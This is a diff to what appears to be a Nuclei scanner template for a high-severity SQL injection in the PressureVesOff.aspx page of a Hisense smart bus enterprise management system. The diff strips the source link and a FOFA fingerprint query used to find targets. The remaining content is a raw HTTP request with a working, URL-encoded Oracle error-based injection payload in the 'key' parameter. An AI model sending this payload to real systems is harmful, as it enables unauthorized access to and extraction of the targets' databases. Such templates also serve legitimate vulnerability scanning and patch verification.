@@ -3,12 +3,8 @@ info:
   name: 海信智能公交企业管理系统 PressureVesOff.aspx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/imkxgna9ok7g5t73'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: imkxgna9ok7g5t73
-    fofa: body="var _FactoryData"
 http:
 - raw:
   - 'GET /YZSoft/Forms/XForm/BM/PressureVesManagement/PressureVesOff.aspx?key=1%27+AND+8768%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%288768%3D8768%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29--+CUzO HTTP/1.1
